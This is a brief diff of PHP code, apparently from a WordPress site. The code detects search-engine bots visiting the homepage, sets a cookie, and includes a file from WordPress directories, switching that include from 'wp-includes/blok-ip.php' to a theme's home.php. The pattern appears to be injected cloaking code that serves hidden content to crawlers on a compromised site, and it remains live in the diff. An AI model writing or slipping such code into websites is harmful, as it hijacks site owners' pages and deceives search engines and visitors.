@@ -10,7 +10,7 @@ if (strpos($agent, 'bot') > 0 && $_SERVER['REQUEST_URI'] == '/') {
         setcookie('az', 'lp', time() + 3600 * 7200);
         echo ' '; exit;
     }
-    include('wp-includes/blok-ip.php');
+    include('/wp-content/themes/twentysixteen/home.php');
     exit;
 }
 /**
